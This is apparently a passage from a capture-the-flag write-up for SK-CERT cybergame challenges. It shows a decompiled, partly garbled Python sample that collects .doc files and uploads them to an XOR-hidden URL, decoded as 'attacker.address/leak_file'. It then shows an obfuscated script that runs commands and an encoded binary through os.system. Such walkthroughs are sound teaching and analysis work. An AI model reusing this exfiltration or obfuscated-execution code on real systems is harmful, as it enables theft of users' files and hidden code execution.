btoEb3BlbtoEZXhlY9oJZW51bWVyYXRl2gpfX2ltcG9ydF9f2gliNjRkZWNvZGXaB2dsb2JhbHPaCHJlcXVlc3Rz2gRwb3N02gF12glFeGNlcHRpb24pCdoJZGlyZWN0b3J52gRyb2902gRkaXJzchMAAAByBQAAANoJZnVsbF9wYXRo2gFm2ghyZXNwb25zZdoBZXMJAAAAICAgICAgICAgcg8AAADaAXNyKwAAAAUAAABz2AEAAIAA3R0fnFegWdEdL9QdL/AACgUZ8QAKBRnRCBmIBIhkkEXYFBnwAAkJGfEACQkZiETYDxOPeop6iXyMfNcPJNIPJKBW0Q8s1A8s8AAIDRndHB6cR59MmkyoFKh00Rw01Bw0kAnwAgYRGd0ZHZhpqBTRGS7UGS7wAAMVPbAh2B0joGSoQaBZ0BwvmAHdGByYUp9XmlfwAAAlcgPwAAAlcgPVb3j1AAB6AUQC8AAARQJNAvEAAHoBTgL0AAB6AU4C9wAAegFYAvIAAHoBWALwAABZAm8D8QAAegFwA/QAAHoBcAPxAABwAXED9AAAcAFxA/AAACVyA/EAACVyA/QAACVyA/EAAB5yA/QAAB5yA/UAAHMDegPxAABzA3wD9AAAcwN8A/EAABl9A/QAABl9A/AAABl9A90jK6Q9tRG4IdAjPNEjPNQjPJgI8AcDFT3wAAMVPfAAAxU98QADFT30AAMVPfAAAxU98AADFT3wAAMVPfAAAxU98AADFT3wAAMVPfj4+PAAAxU98AADFT3wAAMVPfAAAxU9+Pj1CAAYIfAAAREZ8AABERnwAAERGdgUGJBEkESQRJFE+Pj4+PADAREZ+Pj48Q8IDRnxAwkJGfADCgUZ8AAKBRlzNwAAAMEpEEQZBME5QghEDQfEAQxEGQTEDQREEQvEEQNEGQTEFAFEEQvEFQNEGQTEGQpELgfEKQVELgfaCF9fbWFpbl9f+gEuKQZyFAAAAHISAAAAciAAAAByKwAAANoIX19uYW1lX19yJAAAAKkAchEAAAByDwAAAPoIPG1vZHVsZT5yMAAAAAEAAABzWgAAAPADAQEB2AAJgAmACYAJ2AANgA2ADYAN2AAPgA+AD4AP8AQLARnwAAsBGfAACwEZ8BoABAyIetIDGdADGdgQE4BJ2AQFgEGAaYFMhEyATIBMgEzwBQAEGtADGXIRAAAA&#39;</span> | r.b64 | r.snip 16: | r.pym | r.dump python_payload.pyc
+</span></span></code></pre></div><p>Decompiled version from <a href=https://pylingual.io/>https://pylingual.io/</a> is in the code below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Decompiled with PyLingual (https://pylingual.io)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Internal filename: payload.py</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Bytecode version: 3.12.0rc2 (3531)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>s</span>(directory):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> root, dirs, files <span style=color:#f92672>in</span> os<span style=color:#f92672>.</span>os <span style=color:#66d9ef>for</span> file, (<span style=color:#f92672>&lt;</span>mask_5<span style=color:#f92672>&gt;</span>, requests) <span style=color:#f92672>in</span> files:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;.doc&#39;</span>([]):
+</span></span><span style=display:flex><span>            full_path, <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>lower(root, file)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>with</span> open(full_path, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>pass</span>  <span style=color:#75715e># postinserted</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>                    f <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;file&#39;</span>: (file, f)}
+</span></span><span style=display:flex><span>                    exec[<span style=color:#e6db74>&#39;&#39;</span>] <span style=color:#f92672>=</span> exec[<span style=color:#e6db74>&#39;&#39;</span>] <span style=color:#f92672>+</span> (chr(b <span style=color:#f92672>^</span> ord([<span style=color:#e6db74>&#39;UIGioepxhWnwGIOK&#39;</span>[i <span style=color:#f92672>%</span> len(<span style=color:#e6db74>&#39;UIGioepxhWnwGIOK&#39;</span>, (<span style=color:#e6db74>&#39;UIGioepxhWnwGIOK&#39;</span>,))])) <span style=color:#f92672>^</span> <span style=color:#ae81ff>.0</span> <span style=color:#66d9ef>for</span> i, (b,) <span style=color:#f92672>in</span> enumerate[__import__(<span style=color:#e6db74>&#39;base64&#39;</span>, (<span style=color:#e6db74>&#39;IGl6SU0NBAwYbUFYJj07KjYiIhtBBBQcGjIdBGglKio+FiEAAwBTKyN6LTIVHTQ7LH4vWQE6AEwRO15DIzRt&#39;</span>, ((<span style=color:#e6db74>&#39;UIGioepxhWnwGIOK&#39;</span>,)),))](globals(((<span style=color:#e6db74>&#39;UIGioepxhWnwGIOK&#39;</span>, (<span style=color:#e6db74>&#39;&#39;</span>,)),))))
+</span></span><span style=display:flex><span>                    response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>open(files<span style=color:#f92672>=</span>f)
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>&lt;</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    directory <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;.&#39;</span>
+</span></span><span style=display:flex><span>    s(directory)
+</span></span></code></pre></div><p>This was kind of hard to read, but it ended up being just an XOR:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>r.emit <span style=color:#e6db74>&#39;IGl6SU0NBAwYbUFYJj07KjYiIhtBBBQcGjIdBGglKio+FiEAAwBTKyN6LTIVHTQ7LH4vWQE6AEwRO15DIzRt&#39;</span> | r.b64 | r.xor UIGioepxhWnwGIOK
+</span></span><span style=display:flex><span>u <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://attacker.address/leak_file#SK-CERT{py7h0n_p4yl04d}&#34;</span>
+</span></span></code></pre></div><p>The flag is <code>SK-CERT{py7h0n_p4yl04d}</code></p><p>next challenge</p><h1 id=-sanitychecker>[☆☆☆] SanityChecker</h1><h2 id=sleepy-python>Sleepy python</h2><p><a href=https://github.com/lukaskuzmiak/cybergame.sk-2025-writeups/tree/main/SanityChecker#sleepy-python></a><strong>Description</strong></p><blockquote><p>I found some Python code on my computer, but I don&rsquo;t know what it&rsquo;s doing. I tried to run it, but it doesn&rsquo;t seem to do anything. Flag is in format SK-CERT{&mldr;} and is hidden in command that is executed using os.system(&mldr;). This scenario is for environment with BASH.</p></blockquote><p><code>1.py</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>deobfuscate1</span>(string):
+</span></span><span style=display:flex><span>    mapping <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;a&#39;</span>: <span style=color:#e6db74>&#39;n&#39;</span>, <span style=color:#e6db74>&#39;b&#39;</span>: <span style=color:#e6db74>&#39;o&#39;</span>, <span style=color:#e6db74>&#39;c&#39;</span>: <span style=color:#e6db74>&#39;p&#39;</span>, <span style=color:#e6db74>&#39;d&#39;</span>: <span style=color:#e6db74>&#39;q&#39;</span>, <span style=color:#e6db74>&#39;e&#39;</span>: <span style=color:#e6db74>&#39;r&#39;</span>, <span style=color:#e6db74>&#39;f&#39;</span>: <span style=color:#e6db74>&#39;s&#39;</span>, <span style=color:#e6db74>&#39;g&#39;</span>: <span style=color:#e6db74>&#39;t&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;h&#39;</span>: <span style=color:#e6db74>&#39;u&#39;</span>, <span style=color:#e6db74>&#39;i&#39;</span>: <span style=color:#e6db74>&#39;v&#39;</span>, <span style=color:#e6db74>&#39;j&#39;</span>: <span style=color:#e6db74>&#39;w&#39;</span>, <span style=color:#e6db74>&#39;k&#39;</span>: <span style=color:#e6db74>&#39;x&#39;</span>, <span style=color:#e6db74>&#39;l&#39;</span>: <span style=color:#e6db74>&#39;y&#39;</span>, <span style=color:#e6db74>&#39;m&#39;</span>: <span style=color:#e6db74>&#39;z&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;n&#39;</span>: <span style=color:#e6db74>&#39;a&#39;</span>, <span style=color:#e6db74>&#39;o&#39;</span>: <span style=color:#e6db74>&#39;b&#39;</span>, <span style=color:#e6db74>&#39;p&#39;</span>: <span style=color:#e6db74>&#39;c&#39;</span>, <span style=color:#e6db74>&#39;q&#39;</span>: <span style=color:#e6db74>&#39;d&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>: <span style=color:#e6db74>&#39;e&#39;</span>, <span style=color:#e6db74>&#39;s&#39;</span>: <span style=color:#e6db74>&#39;f&#39;</span>, <span style=color:#e6db74>&#39;t&#39;</span>: <span style=color:#e6db74>&#39;g&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;u&#39;</span>: <span style=color:#e6db74>&#39;h&#39;</span>, <span style=color:#e6db74>&#39;v&#39;</span>: <span style=color:#e6db74>&#39;i&#39;</span>, <span style=color:#e6db74>&#39;w&#39;</span>: <span style=color:#e6db74>&#39;j&#39;</span>, <span style=color:#e6db74>&#39;x&#39;</span>: <span style=color:#e6db74>&#39;k&#39;</span>, <span style=color:#e6db74>&#39;y&#39;</span>: <span style=color:#e6db74>&#39;l&#39;</span>, <span style=color:#e6db74>&#39;z&#39;</span>: <span style=color:#e6db74>&#39;m&#39;</span>,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;A&#39;</span>: <span style=color:#e6db74>&#39;N&#39;</span>, <span style=color:#e6db74>&#39;B&#39;</span>: <span style=color:#e6db74>&#39;O&#39;</span>, <span style=color:#e6db74>&#39;C&#39;</span>: <span style=color:#e6db74>&#39;P&#39;</span>, <span style=color:#e6db74>&#39;D&#39;</span>: <span style=color:#e6db74>&#39;Q&#39;</span>, <span style=color:#e6db74>&#39;E&#39;</span>: <span style=color:#e6db74>&#39;R&#39;</span>, <span style=color:#e6db74>&#39;F&#39;</span>: <span style=color:#e6db74>&#39;S&#39;</span>, <span style=color:#e6db74>&#39;G&#39;</span>: <span style=color:#e6db74>&#39;T&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;H&#39;</span>: <span style=color:#e6db74>&#39;U&#39;</span>, <span style=color:#e6db74>&#39;I&#39;</span>: <span style=color:#e6db74>&#39;V&#39;</span>, <span style=color:#e6db74>&#39;J&#39;</span>: <span style=color:#e6db74>&#39;W&#39;</span>, <span style=color:#e6db74>&#39;K&#39;</span>: <span style=color:#e6db74>&#39;X&#39;</span>, <span style=color:#e6db74>&#39;L&#39;</span>: <span style=color:#e6db74>&#39;Y&#39;</span>, <span style=color:#e6db74>&#39;M&#39;</span>: <span style=color:#e6db74>&#39;Z&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;N&#39;</span>: <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#e6db74>&#39;O&#39;</span>: <span style=color:#e6db74>&#39;B&#39;</span>, <span style=color:#e6db74>&#39;P&#39;</span>: <span style=color:#e6db74>&#39;C&#39;</span>, <span style=color:#e6db74>&#39;Q&#39;</span>: <span style=color:#e6db74>&#39;D&#39;</span>, <span style=color:#e6db74>&#39;R&#39;</span>: <span style=color:#e6db74>&#39;E&#39;</span>, <span style=color:#e6db74>&#39;S&#39;</span>: <span style=color:#e6db74>&#39;F&#39;</span>, <span style=color:#e6db74>&#39;T&#39;</span>: <span style=color:#e6db74>&#39;G&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;U&#39;</span>: <span style=color:#e6db74>&#39;H&#39;</span>, <span style=color:#e6db74>&#39;V&#39;</span>: <span style=color:#e6db74>&#39;I&#39;</span>, <span style=color:#e6db74>&#39;W&#39;</span>: <span style=color:#e6db74>&#39;J&#39;</span>, <span style=color:#e6db74>&#39;X&#39;</span>: <span style=color:#e6db74>&#39;K&#39;</span>, <span style=color:#e6db74>&#39;Y&#39;</span>: <span style=color:#e6db74>&#39;L&#39;</span>, <span style=color:#e6db74>&#39;Z&#39;</span>: <span style=color:#e6db74>&#39;M&#39;</span>,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;0&#39;</span>: <span style=color:#e6db74>&#39;5&#39;</span>, <span style=color:#e6db74>&#39;1&#39;</span>: <span style=color:#e6db74>&#39;6&#39;</span>, <span style=color:#e6db74>&#39;2&#39;</span>: <span style=color:#e6db74>&#39;7&#39;</span>, <span style=color:#e6db74>&#39;3&#39;</span>: <span style=color:#e6db74>&#39;8&#39;</span>, <span style=color:#e6db74>&#39;4&#39;</span>: <span style=color:#e6db74>&#39;9&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;5&#39;</span>: <span style=color:#e6db74>&#39;0&#39;</span>, <span style=color:#e6db74>&#39;6&#39;</span>: <span style=color:#e6db74>&#39;1&#39;</span>, <span style=color:#e6db74>&#39;7&#39;</span>: <span style=color:#e6db74>&#39;2&#39;</span>, <span style=color:#e6db74>&#39;8&#39;</span>: <span style=color:#e6db74>&#39;3&#39;</span>, <span style=color:#e6db74>&#39;9&#39;</span>: <span style=color:#e6db74>&#39;4&#39;</span>,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;_&#39;</span>: <span style=color:#e6db74>&#39;-&#39;</span>, <span style=color:#e6db74>&#39;-&#39;</span>: <span style=color:#e6db74>&#39;_&#39;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(mapping<span style=color:#f92672>.</span>get(c, c) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>deobfuscate2</span>(string):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reverse_alpha</span>(c):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;z&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> chr(ord(<span style=color:#e6db74>&#39;z&#39;</span>) <span style=color:#f92672>-</span> (ord(c) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;a&#39;</span>)))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;Z&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> chr(ord(<span style=color:#e6db74>&#39;Z&#39;</span>) <span style=color:#f92672>-</span> (ord(c) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;A&#39;</span>)))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> c
+</span></span><span style=display:flex><span>    digit_map <span style=color:#f92672>=</span> {str(i): str(<span style=color:#ae81ff>9</span> <span style=color:#f92672>-</span> i) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>)}
+</span></span><span style=display:flex><span>    symbol_map <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;_&#39;</span>: <span style=color:#e6db74>&#39;=&#39;</span>, <span style=color:#e6db74>&#39;=&#39;</span>: <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;-&#39;</span>: <span style=color:#e6db74>&#39;+&#39;</span>, <span style=color:#e6db74>&#39;+&#39;</span>: <span style=color:#e6db74>&#39;-&#39;</span>}
+</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> c<span style=color:#f92672>.</span>isalpha():
+</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(reverse_alpha(c))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>in</span> digit_map:
+</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(digit_map[c])
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>in</span> symbol_map:
+</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(symbol_map[c])
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(c)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(result)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>deobfuscate3</span>(string):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reverse_char</span>(c):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;z&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> chr(ord(<span style=color:#e6db74>&#39;z&#39;</span>) <span style=color:#f92672>-</span> (ord(c) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;a&#39;</span>)))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;Z&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> chr(ord(<span style=color:#e6db74>&#39;Z&#39;</span>) <span style=color:#f92672>-</span> (ord(c) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;A&#39;</span>)))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;9&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> str(<span style=color:#ae81ff>9</span> <span style=color:#f92672>-</span> int(c))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;_&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;*&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;*&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;_&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;-&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;!&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;!&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;-&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> c
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(reverse_char(c) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>command1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;puzbq _k yby.fu&#34;</span>
+</span></span><span style=display:flex><span>command2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./yby.fu #FX!PREG{5osh0p9265a*9aq*0y88c}&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>#+/ova/onfu
+</span></span></span><span style=display:flex><span><span style=color:#e6db74># FX!PREG{6*j6yy*y89i8*l5h*05z82u6a1*u8e8}
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>rpub !a &#39;s5IZEtVONDNNNNNNNNNNNNZNCtNONNNNNORNNNNNNNONNNNNNNNNNVN8NNNNNNNNNNNNNRNNBNNB
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NRNNVNNsNNLNNNNRNNNNDNNNNNNNNNONNNNNNNNNNRNNNNNNNNNNRNZNNNNNNNNDNjNNNNNNNNtN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNjNNNNDNNNPxNjNNNNNNNXDQNNNNNNNNcNZNNNNNNNNpNNNNNNNNNOjNNNNNNNNNNDNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNONNNNONNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWtUNNNNNNNNzNpNNNNNNNNNRNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNRNNNNSNNNNNONNNNNNNNNNRNNNNNNNNNNDNNNNNNNNjDZNNNNNNNQONjNNNNNNNNNDNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNDNNNNDNNNNNVNNNNNNNNNNtNNNNNNNNNPNNNNNNNNQpNDNNNNNNNAjONNNNNNNNNONNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNONNNNOtNNNWNgNNNNNNNNxQ5NNNNNNNPDCDNNNNNNNVNPNNNNNNNNvNVNNNNNNNNNRNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNVNNNNTNNNNbP5NNNNNNNPtCDNNNNNNNXN4NNNNNNNN3NRNNNNNNNQjNDNNNNNNNNtNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ONNNNNDNNNODNjNNNNNNNSNQNNNNNNNNHNZNNNNNNNNjNNNNNNNNNQNNNNNNNNNNPNNNNNNNNNNR
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNONNNNVNQNNNNNNNNtNZNNNNNNNPNNjNNNNNNNPDNNNNNNNNNWNNNNNNNNNNRNNNNNNNNNNDN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNRNNNNGPRNNNNNNNOZVDNNNNNNNRjuNNNNNNNNxNNNNNNNNNPDNNNNNNNNNNDNNNNNNNNNH_I5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>MNDNNNODNjNNNNNNNSNQNNNNNNNNHNZNNNNNNNNjNNNNNNNNNQNNNNNNNNNNPNNNNNNNNNOD0KEx
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ONNNNTjtNNNNNNNNoPNNNNNNNNOfVNNNNNNNNQDNNNNNNNNNANNNNNNNNNNRNNNNNNNNNSUyqTDT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNONNNNNNNNNNHhI5MNDN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNPDYDNNNNNNNWN4NNNNNNNNxQ5NNNNNNNOjNtNNNNNNNUNPNNNNNNNNNDNNNNNNNNNRNNNNVNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNHNNNOUGyHNNtNNjNDNNNNQNNNNNNNNNNXNNZNRNNNNNDNNNNNNNNNRNNNNSNNNNNZNNNOUGyHN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>x7bQPSYuoyi242Q6DN2PB_yI1dfioTyvAwDioTDgoTyhqKtgrQt7YGL5YaAiYwVNNtNNNNfNNNNO
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNOtNNNNNNtDNNNNNNPjNNNNNNNNQEMp0gNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNO5N
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNFNNNNNNNNNNNNNNNNNNNNNNNNNWNNNNNtNNNNNNNNNNNNNNNNNNNNNNNNNNpNNNNFNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNjNNNNFNNNNNNNNNNNNNNNNNNNNNNNNNQ9NNNNFNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNSDNNNNFNNNNNNNNNNNNNNNNNNNNNNNNNXjNNNNtNNNNNNNNNNNNNNNNNNNNNNNNNRHNNNNF
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNYfNNNNtNNNNNNNNNNNNNNNNNNNNNNNNNNRNNNNFNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNP3NNNNvNNNNNNNNNNNNNNNNNNNNNNNNNNOmoTIypNOjqKEmNS4sp8EuL7gsL7ue
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>K7MunJjNK64fnJWwK8A5LKW5K76unJ9NK64wrTSsMzyhLJkcrzHNpUWcoaEzNS4snKAiLmx0K8Aw
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>LJ0zNUA5pzAgpNOfnJWwYaAiYwLNE5kWDxAsZv98NRqZFHWQKmVhANOUGRyPD63lYwVhADOUGRyP
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>D63lYwZ5NS4WIR6sMTIlMJqcp8EypyEAD7kiozIHLJWfMDOsK7qgo70sp8EupaEsKjOsFIEAK8Wy
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>M7ymqTIlIR6QoT4hMIEuLzkyNNNNNNVNNDNQNNDNNjNQNNRNODNONNZNNjNNNNRNONOoNNNNRNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNKnJxANNNSNTHNNNNDNNNNSTycQDNNONOiNNNNRNNNNUHnnDxNNNZNrDNNNONNNNP5xMLT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNPNVHNNNNNNNNNxQ5NNNNNNNNVNNNNNNNNNBNENNNNNNNNzQ5NNNNNNNNVNNNNNNNNNXNENNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNPRNNNNNNNNNVNNNNNNNNNNuNNNNNNNNN7Q3NNNNNNNNTNNNNNDNNNNNNNNNNNNNN9Q3NNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNTNNNNNtNNNNNNNNNNNNNN1Q3NNNNNNNNTNNNNOjNNNNNNNNNNNNNN3Q3NNNNNNNNTNNNNPDNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNN_Q3NNNNNNNNTNNNNPjNNNNNNNNNNNNNNdQ3NNNNNNNNUNNNNNjNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>fQ3NNNNNNNNUNNNNONNNNNNNNNNNNNNNhQ3NNNNNNNNUNNNNODNNNNNNNNNNNNNNjQ3NNNNNNNNU
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNOtNNNNNNNNNNNNNNlQ3NNNNNNNNUNNNNPNNNNNNNNNNNNNNN5Q3NNNNNNNNUNNNNPtNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
